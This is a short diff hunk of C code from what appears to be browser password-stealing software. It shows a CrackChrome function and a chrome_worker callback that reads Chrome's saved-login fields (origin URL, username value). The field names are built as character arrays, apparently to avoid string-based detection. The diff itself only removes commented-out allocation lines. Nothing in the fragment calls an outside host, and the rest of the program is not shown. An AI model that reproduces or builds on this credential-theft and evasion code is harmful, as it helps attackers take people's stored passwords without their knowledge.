@@ -93,8 +93,8 @@ LPSTR CrackChrome(PBYTE pass) {
 int chrome_worker(PVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
 {
 	LPSTR strResource = NULL;
-	LPSTR strUser = NULL; // (LPSTR) talloc(1024*sizeof(char));
-	LPSTR strPass = NULL; // (LPSTR) talloc(1024*sizeof(char));
+	LPSTR strUser = NULL; 
+	LPSTR strPass = NULL;
 
 	CHAR strOrigin[] = { 'o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', 0x0 };
 	CHAR strUserVal[] = { 'u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };
